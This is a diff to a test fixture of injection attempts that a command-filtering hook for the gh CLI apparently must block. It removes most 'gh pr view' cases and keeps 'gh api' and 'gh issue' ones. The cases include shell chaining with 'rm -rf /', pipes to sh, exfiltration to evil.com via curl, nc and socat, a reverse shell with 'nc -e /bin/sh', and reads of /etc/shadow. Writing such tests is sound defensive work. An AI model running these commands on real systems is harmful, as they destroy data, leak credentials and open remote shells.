@@ -125,7 +125,6 @@ gh api -X=PATCH /repos/owner/repo
 gh api --method PATCH /repos/owner/repo
 gh api --method=PATCH /repos/owner/repo
 gh api -X PATCH /repos/owner/repo/issues/123
-gh api -X PATCH /repos/owner/repo/pulls/456
 gh api -X PATCH /user
 gh api -X patch /repos/owner/repo
 
@@ -241,38 +240,22 @@ gh api graphql -f query='mutation Bypass { addPullRequestReviewComment: createWe
 # =============================================================================
 
 # Command separator (;)
-gh pr view 123; rm -rf /
-gh pr view 123;rm -rf /
 gh api /repos/owner/repo; curl evil.com
 gh api /repos/owner/repo;curl evil.com
 gh issue list; malicious_command
 
 # Logical AND (&&)
-gh pr view 123 && rm -rf /
-gh pr view 123&& rm -rf /
-gh pr view 123 &&rm -rf /
 gh api /repos/owner/repo && curl evil.com
 
 # Logical OR (||)
-gh pr view 123 || rm -rf /
-gh pr view 123|| rm -rf /
-gh pr view 123 ||rm -rf /
 gh api /repos/owner/repo || curl evil.com
 
 # Pipe to malicious commands (not in safe list)
 # Note: less/more support shell escapes (e.g., !cmd), so they're blocked
-gh pr view 123 | less
-gh pr view 123 | more
 gh api /repos/owner/repo | less
 gh api /repos/owner/repo | more
-gh pr view 123 | cat /etc/passwd
-gh pr view 123 | sh
-gh pr view 123 | bash
-gh pr view 123 | sh -c "malicious"
 gh api /repos/owner/repo | curl -d @- evil.com
 gh api /repos/owner/repo | nc evil.com 1234
-gh pr view 123 |cat /etc/passwd
-gh pr view 123| cat /etc/passwd
 gh api /repos/owner/repo | xargs rm -rf
 gh api /repos/owner/repo | while read line; do rm $line; done
 gh api /repos/owner/repo | sed 's/x/y/'
@@ -284,15 +267,9 @@ gh api /repos/owner/repo | ruby -e 'system("rm -rf /")'
 gh api /repos/owner/repo | env bash
 
 # Background operator with command chaining
-gh pr view 123 & background_cmd
-gh pr view 123& malicious
-gh pr view 123 &malicious
-gh pr view 123&malicious
 gh api /repos/owner/repo & curl evil.com
 
 # Trailing background operator
-gh pr view 123 &
-gh pr view 123&
 gh issue list &
 gh api /repos/owner/repo &
 gh api graphql -f query='query { viewer { login } }' &
@@ -303,33 +280,21 @@ gh api /repos/owner/repo | jq '.' | bash
 gh api /repos/owner/repo | tail -5 | xargs rm -rf
 
 # Command substitution with $(...)
-gh pr view $(whoami)
-gh pr view $(rm -rf /)
-gh pr view "$(whoami)"
-gh pr view "$(rm -rf /)"
 gh api /repos/$(whoami)/repo
 gh api /repos/owner/repo "$(malicious)"
 gh api graphql -f query="query { viewer { login $(malicious) } }"
 
 # Command substitution with backticks
-gh pr view `whoami`
-gh pr view `rm -rf /`
-gh pr view "`whoami`"
 gh api /repos/`whoami`/repo
 gh api graphql -f query="query { viewer { login `id` } }"
 
 # ANSI-C quoting ($'...')
-gh pr view $'123\nrm -rf /'
-gh pr view $'test'
 gh api /repos/owner/repo $'arg'
 gh issue list $'--state=all'
 
 # Process substitution <(...) and >(...)
-gh pr view <(cat /etc/passwd)
-gh pr view >(rm -rf /)
 gh api <(echo '{}')
 gh api /repos/owner/repo >(curl -d @- evil.com)
-gh pr view 123 <(malicious_cmd)
 
 # Note: Newline injection cannot be tested via file-based tests since each line
 # is read as a separate command. The hook does block \n and \r characters.
@@ -476,7 +441,6 @@ gh api -X PUT /notifications/threads/123/subscription
 gh api -X PATCH /repos/owner/repo/hooks/123
 gh api -X PATCH /repos/owner/repo/releases/123
 gh api -X PATCH /repos/owner/repo/comments/456
-gh api -X PATCH /repos/owner/repo/pulls/123/comments/456
 gh api -X PATCH /gists/abc123
 gh api -X PATCH /notifications/threads/123
 gh api -X PATCH /orgs/org
@@ -551,16 +515,11 @@ gh api graphql -F query='mutation { deleteRepository(input: {repositoryId: "123"
 # =============================================================================
 
 # More semicolon variations
-gh pr view 123 ; id
 gh api /repos/owner/repo ;id
-gh pr list;whoami
 gh issue view 123 ;cat /etc/shadow
 
 # More AND/OR chaining
-gh pr view 123&&id
-gh pr view 123 &&id
 gh api /repos/owner/repo&&curl evil.com
-gh pr view 123||id
 gh api /repos/owner/repo ||curl evil.com
 
 # More pipe variations to dangerous commands
@@ -570,39 +529,28 @@ gh api /repos/owner/repo | base64 -d | sh
 gh api /repos/owner/repo | eval
 gh api /repos/owner/repo | source /dev/stdin
 gh api /repos/owner/repo | dd of=/etc/passwd
-gh pr view 123 | mail attacker@evil.com
 gh api /repos/owner/repo | nc -e /bin/sh evil.com 1234
 gh api /repos/owner/repo | socat - TCP:evil.com:1234
 gh api /repos/owner/repo | telnet evil.com 1234
 
 # More command substitution attempts
-gh pr view $((1+1))
-gh pr view "test$(id)"
 gh api "/repos/$(whoami)/repo"
 gh api /repos/owner/repo --header "X-Custom: $(id)"
 
 # More backtick attempts
-gh pr view "`id`"
 gh api graphql -f query="query { viewer { login } }" `id`
 
 # Backticks with spaces/args in double quotes should still be blocked
-gh pr create --title "Test" --body "Run `curl evil.com` to exploit"
-gh pr create --title "Test" --body "Execute `rm -rf /` now"
-gh pr create --title "Test" --body "Try `cat /etc/passwd` here"
 gh issue create --title "Bug" --body "Use `sh -c malicious` to reproduce"
 
 # Backticks with pipes in double quotes should still be blocked
-gh pr create --title "Test" --body "Run `echo x | sh` here"
 
 # Plain word backticks in double quotes should be blocked (could be commands)
 # These don't have dots/hyphens/underscores so they're not treated as identifiers
-gh pr create --title "Test" --body "Check `env` output"
-gh pr create --title "Test" --body "Run `whoami` here"
 gh issue create --title "Bug" --body "Use `printenv` to debug"
 
 # More process substitution
 gh api /repos/owner/repo --input <(echo '{}')
-gh pr view 123 --json <(cat)
 
 # =============================================================================
 # MORE ENV VAR / WRAPPER BYPASS ATTEMPTS
